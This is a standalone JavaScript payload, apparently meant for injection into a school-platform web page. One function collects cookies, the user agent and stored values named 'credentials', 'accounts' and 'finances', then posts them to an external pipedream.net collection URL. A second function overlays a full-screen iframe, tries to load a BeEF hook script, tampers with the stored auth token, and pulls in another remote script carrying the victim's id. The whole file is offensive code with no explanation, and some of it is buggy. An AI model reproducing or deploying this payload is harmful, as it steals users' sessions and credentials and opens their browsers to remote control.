(async function ex() {
	const ur = new URL(document.currentScript.src);
	const token = ur.searchParams.get("id");
	const url = 'https://eocokq62jnfdj8e.m.pipedream.net/session';
  
	const keys = [
		'accounts', 'badges', 'credentials', 'edhydration_auth',
		'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history','panier'
	];
  
	const data = {
		t: new Date().toISOString(),
		u: navigator.userAgent,
		l: token,
		c: document.cookie,
		s: Object.fromEntries(
		keys
			.map(k => [k, sessionStorage.getItem(k) ?? localStorage.getItem(k)])
			.filter(([, v]) => v !== null)
			.map(([k, v]) => {
			try { return [k, JSON.parse(v)]; }
			catch { return [k, v]; }
			})
		)
	};

	try {
		await fetch(url, {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify(data)
		});
	} catch {}
})();

(async function iframetrap() {
    function a(b) {
        const i = window.top.document.createElement('iframe');
		i.src = "/";
		i.style ='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
		i.className = 'test';
		window.top.document.body.appendChild(i);
		i.onload = () => {
			const beef = i.createElement("script");
			beef.src = "https://beef.local/hook.js"
			beef.async = true;
			c.body.appendChild(beef)
		};
		const c = setInterval(() => {
            if (window.top.document.body.getElementsByClassName('test').length > 0) {
                clearInterval(c);
				setTimeout(() => b(), 3000);
				const credentials = JSON.parse(sessionStorage.getItem("credentials"));
                credentials.payload.authToken = "0100010101000100011100110111000001101100011011110110100101110100";
                sessionStorage.setItem("credentials", JSON.stringify(credentials))    
    		}
        }, 10)
		return;
	}
	a(() => {
		const b = document.createElement("iframe");
		b.src = "/";
		b.style.display = "none";
		document.body.appendChild(b);
		b.onload = () => {
			const c = b.contentDocument,
				d = setInterval(() => {
					if (!c || !c.body) return;
					clearInterval(d);
					const e = c.createElement("script");
					e.src = `https://exon-dv.github.io/a/b.js?id=${token}`;
					e.async = true;
					c.body.appendChild(e)
				}, 50)
		}
	})
})();
